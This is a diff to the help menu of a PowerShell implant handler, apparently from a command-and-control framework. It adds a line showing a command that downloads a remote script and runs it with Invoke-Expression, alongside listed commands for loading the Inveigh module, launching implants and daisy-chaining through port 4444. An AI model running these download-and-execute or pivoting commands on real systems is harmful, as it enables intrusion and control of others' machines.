@@ -129,6 +129,7 @@ function Implant-Handler
         write-host " ModulesLoaded " -ForegroundColor Green 
         write-host " LoadModule <modulename>" -ForegroundColor Green 
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
+        write-host " Invoke-Expression (Get-Webclient).DownloadString(\"https://module.ps1\")" -ForegroundColor Green
         write-host " StartAnotherImplant" -ForegroundColor Green 
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -port 4444 -daisyserver 192.168.1.1" -ForegroundColor Green
